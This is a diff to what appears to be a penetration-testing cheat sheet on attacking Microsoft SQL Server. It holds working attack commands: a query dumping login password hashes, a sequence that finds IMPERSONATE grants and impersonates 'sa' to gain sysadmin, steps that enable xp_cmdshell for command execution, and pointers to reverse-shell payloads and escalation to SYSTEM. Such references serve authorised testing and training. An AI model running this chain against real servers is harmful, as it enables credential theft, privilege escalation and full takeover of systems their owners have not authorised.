@@ -249,11 +249,25 @@ nmap -Pn -p 1433 --script ms-sql-info,ms-sql-config,ms-sql-ntlm-info $TARGET
 SELECT name FROM master..sysdatabases;
 SELECT sp.name, sl.password_hash FROM sys.server_principals sp JOIN sys.sql_logins sl ON sp.principal_id = sl.principal_id;
 
-# RCE via xp_cmdshell
+# Check current role and permissions
+SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
+SELECT * FROM fn_my_permissions(NULL, 'SERVER');
+
+# Escalate via impersonation (if not already sysadmin)
+SELECT distinct b.name FROM sys.server_permissions a
+INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE';
+-- If sa or another sysadmin appears:
+EXECUTE AS LOGIN = 'sa';
+SELECT IS_SRVROLEMEMBER('sysadmin');   -- 1 = success, now proceed to xp_cmdshell
+-- REVERT; to drop impersonation
+
+# RCE via xp_cmdshell (requires sysadmin — use impersonation above if needed)
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 EXEC xp_cmdshell 'whoami';
 -- → Shell via xp_cmdshell: use [08_reverse_shells.md](./08_reverse_shells.md) Windows payloads → [05_windows_privesc.md](./05_windows_privesc.md)
+-- → SQL Server service accounts almost always have SeImpersonatePrivilege → GodPotato/PrintSpoofer → SYSTEM → [06_active_directory.md MSSQL section]
 ```
 
 ```sql
